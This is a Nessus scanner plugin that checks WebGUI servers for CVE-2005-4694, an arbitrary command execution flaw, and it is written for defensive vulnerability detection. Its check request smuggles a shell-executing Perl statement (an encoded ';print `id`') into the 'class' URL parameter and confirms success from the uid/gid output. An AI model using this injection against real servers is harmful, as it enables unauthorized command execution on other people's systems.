#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  This script is released under the GNU GPL v2
#

# Changes by Tenable:
# - Revised plugin title (4/13/2009)

include("compat.inc");

if (description) {
script_id(20014);
script_version("$Revision: 1.7 $");
script_cve_id("CVE-2005-4694");
script_bugtraq_id(15083);
script_xref(name:"OSVDB", value:"19933");

script_name(english:"WebGUI < 6.7.6 Asset.pm Asset Addition Arbitrary Code Execution");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WebGUI, a content management system from
Plain Black Software. 

The installed version of WebGUI on the remote host fails to sanitize
user-supplied input via the 'class' variable to various sources before
using it to run commands.  By leveraging this flaw, an attacker may be
able to execute arbitrary commands on the remote host within the
context of the affected web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?37c9ea6b" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WebGUI 6.7.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


script_summary(english:"Checks for arbitrary remote command execution in WebGUI < 6.7.6");

script_category(ACT_GATHER_INFO);
script_family(english:"CGI abuses");

script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");

script_dependencies("http_version.nasl");
script_exclude_keys("Settings/disable_cgi_scanning");
script_require_ports("Services/www", 80);

exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			extra_check:'<meta name="generator" content="WebGUI 6',
			command:"id"
			);
